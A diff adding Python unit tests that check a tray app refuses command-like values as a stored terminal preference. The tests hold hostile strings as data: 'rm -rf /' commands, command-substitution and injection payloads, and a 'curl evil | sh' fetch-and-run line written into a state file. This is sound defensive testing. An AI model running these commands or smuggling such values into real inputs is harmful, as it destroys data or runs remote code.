@@ -273,3 +273,80 @@ class CardActionTest(CliTestBase):
 
 if __name__ == "__main__":
     unittest.main()
+
+
+class TerminalPreferenceTest(CliTestBase):
+    """What may be stored as a terminal, and what may not.
+
+    The restriction is the security argument: a preference that could hold a
+    command line would be a way to run anything, in a process the user did not
+    start, triggered by clicking a menu row.
+    """
+
+    def test_no_preference_by_default(self):
+        from src.tray_terminal import terminal_preference
+        self.assertIsNone(terminal_preference(self.make_temp_dir()))
+
+    def test_an_application_name_is_stored_and_reversible(self):
+        from src.tray_terminal import clear_terminal, set_terminal, terminal_preference
+        base = self.make_temp_dir()
+        for name in ("iTerm", "Ghostty", "WezTerm", "kitty", "wt", "Visual Studio Code", "com.googlecode.iterm2"):
+            self.assertEqual(set_terminal(base, name), name)
+            self.assertEqual(terminal_preference(base), name)
+        clear_terminal(base)
+        self.assertIsNone(terminal_preference(base))
+
+    def test_anything_that_could_be_a_command_is_refused(self):
+        from src.tray_terminal import set_terminal, terminal_preference
+        base = self.make_temp_dir()
+        for hostile in (
+            "sh -c 'rm -rf /'",
+            "/bin/sh",
+            "iTerm; rm -rf /",
+            "$(whoami)",
+            "`id`",
+            "a && b",
+            "a | b",
+            "../../bin/sh",
+            "-flag",
+            "",
+            "x" * 200,
+            None,
+            7,
+        ):
+            with self.assertRaises(ValueError, msg=repr(hostile)):
+                set_terminal(base, hostile)
+            self.assertIsNone(terminal_preference(base), repr(hostile))
+
+    def test_a_stored_value_that_no_longer_validates_is_not_honoured(self):
+        """A rule that only applied at write time would be no rule at all: the
+        state file is a file, and anything that can write it would bypass it."""
+        import json
+        import os
+
+        from src.tray_terminal import state_path, terminal_preference
+        base = self.make_temp_dir()
+        path = state_path(base)
+        os.makedirs(os.path.dirname(path), exist_ok=True)
+        with open(path, "w", encoding="utf-8") as handle:
+            json.dump({"version": 1, "terminal": "sh -c 'curl evil | sh'"}, handle)
+        self.assertIsNone(terminal_preference(base))
+
+    def test_an_unreadable_state_is_no_preference(self):
+        import os
+
+        from src.tray_terminal import state_path, terminal_preference
+        base = self.make_temp_dir()
+        path = state_path(base)
+        os.makedirs(os.path.dirname(path), exist_ok=True)
+        with open(path, "w", encoding="utf-8") as handle:
+            handle.write("{ not json")
+        self.assertIsNone(terminal_preference(base))
+
+    def test_the_snapshot_carries_it(self):
+        from datetime import datetime, timezone
+
+        from src.tray_contract import build_snapshot
+        snapshot = build_snapshot([], datetime.now(timezone.utc), "0.0.0", terminal="Ghostty")
+        self.assertEqual(snapshot["terminal"], "Ghostty")
+        self.assertIsNone(build_snapshot([], datetime.now(timezone.utc), "0.0.0")["terminal"])
